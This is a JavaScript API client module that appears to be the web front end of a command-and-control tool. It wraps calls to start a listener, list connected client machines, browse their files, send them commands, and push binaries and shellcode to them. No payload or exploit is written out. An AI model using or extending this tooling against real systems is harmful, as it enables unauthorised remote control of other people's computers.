// Base URL for the API endpoints
const API_BASE = '';

async function controlRequest(path, body) {
    const response = await fetch(`${API_BASE}${path}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
    });
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Request failed');
    return data;
}

// API service functions for communicating with the backend
export const apiService = {
    async taskHistory(agentID) {
        const response = await fetch(`${API_BASE}/task-history?agent=${encodeURIComponent(agentID)}`);
        const data = await response.json(); if (!response.ok) throw new Error(data.error || 'History unavailable'); return data;
    },
    async taskDetails(id) {
        const response = await fetch(`${API_BASE}/task-history?task=${encodeURIComponent(id)}`);
        const data = await response.json(); if (!response.ok) throw new Error(data.error || 'Task unavailable'); return data;
    },
    async auditHistory() {
        const response = await fetch(`${API_BASE}/audit-history`);
        const data = await response.json(); if (!response.ok) throw new Error(data.error || 'Audit unavailable'); return data;
    },
    async browseFiles(client, path, signal, source = 'dir', refresh = false, cacheOnly = false) {
        const response = await fetch(`${API_BASE}/browse-files`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client, path, source, refresh, cache_only: cacheOnly }), signal,
        });
        const data = await response.json();
        if (!response.ok) throw new Error(data.error || 'Directory request failed');
        return data;
    },
    async linkSession(savedID, liveID) {
        const result = await fetch(`${API_BASE}/link-session`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ saved_id: savedID, live_id: liveID }),
        });
        const data = await result.json();
        if (!result.ok) throw new Error(data.error || 'Could not link sessions');
        return data;
    },
    async startListener() { return controlRequest('/start-listener', {}); },
    async stopListener() { return controlRequest('/stop-listener', {}); },
    async disconnectSession(id) { return controlRequest('/disconnect-session', { id }); },
    async getListenerStatus() {
        const response = await fetch(`${API_BASE}/listener-status`);
        if (!response.ok) throw new Error('Could not read listener status');
        return response.json();
    },

    // Retrieves the list of connected clients from the server
    async getClients() {
        const result = await fetch(`${API_BASE}/get-clients`);
        return await result.json(); // parse JSON response
    },

    // Retrieves detailed information about a specific client by IP
    async getClientInfo(clientIP) {
        const result = await fetch(`${API_BASE}/get-client-info?client=${encodeURIComponent(clientIP)}`);
        return await result.json();
    },

    // Retrieves messages for a specific client by IP
    async getClientMessages(clientIP) {
        // NOTE: fetches the messages appended to client.Messages buffer in message_protocol::processClientMessage()
        const result = await fetch(`${API_BASE}/get-client-messages?client=${encodeURIComponent(clientIP)}`);
        return await result.json();
    },

    // Sends a command to a specific client
    async sendCommand(client, command) {
        // POST request with client and command in JSON body
        const result = await fetch(`${API_BASE}/send-command`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ client, command })
        });
        return await result.json();
    },

    // TODO: My_Sends a command to a specific client
    async mySendCommand(client, command) {
        // POST request with client and command in JSON body
        const result = await fetch(`${API_BASE}/my-send-command`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ client, command })
        });
        return await result.json();
    },

    // Sends a binary file to a specific client
    async sendFile(client, file) {
        const formData = new FormData();
        formData.append('client', client);
        formData.append('binaryFile', file); // attach file to form data

        // POST request with form data (multipart/form-data)
        const result = await fetch(`${API_BASE}/send-binary`, {
            method: 'POST',
            body: formData
        });
        return await result.json();
    },

    // Sends a shellcode file to a specific client
    async sendShellcode(client, file) {
        const formData = new FormData();
        formData.append('client', client);
        formData.append('shellcodeFile', file); // attach shellcode file

        const result = await fetch(`${API_BASE}/send-shellcode`, {
            method: 'POST',
            body: formData
        });
        return await result.json();
    }
};

// Utility functions for formatting and status handling
export const utils = {
    // Formats the last seen timestamp of a client
    formatLastSeen(lastSeen) {
        if (!lastSeen) return 'Unknown'; // return fallback if timestamp missing
        const date = new Date(lastSeen);
        return date.toLocaleString(); // return human-readable date/time
    },

    // Formats a message timestamp into a readable time string
    formatMessageTime(timestamp) {
        const date = new Date(timestamp);
        return date.toLocaleTimeString(); // return only time
    },

    // Determines a CSS class for a status string for styling
    getStatusClass(status) {
        if (!status) return ''; // empty status
        if (status.includes('✅') || status.includes('Listener started')) return 'success';
        if (status.includes('❌') || status.includes('Error')) return 'error';
        if (status.includes('Warning:') || status.includes('⚠️') || status.includes('DANGER')) return 'warning';
        return ''; // default if none match
    }
};
